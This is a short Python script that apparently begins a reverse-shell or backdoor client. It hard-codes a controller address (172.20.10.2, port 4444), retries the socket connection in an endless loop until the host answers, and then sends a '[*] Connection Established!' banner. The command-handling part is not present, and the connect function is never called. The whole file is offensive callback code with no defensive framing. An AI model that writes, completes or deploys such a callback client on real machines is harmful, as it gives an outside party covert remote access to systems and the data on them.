import os
import socket
import sys

IP = "172.20.10.2"
PORT = 4444
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def connect(ip: str, port: int):
    server_address = (ip, port)
    while True:
        try:
            sock.connect(server_address)
            break
        except:
            continue
    sock.send(str.encode("[*] Connection Established!"))
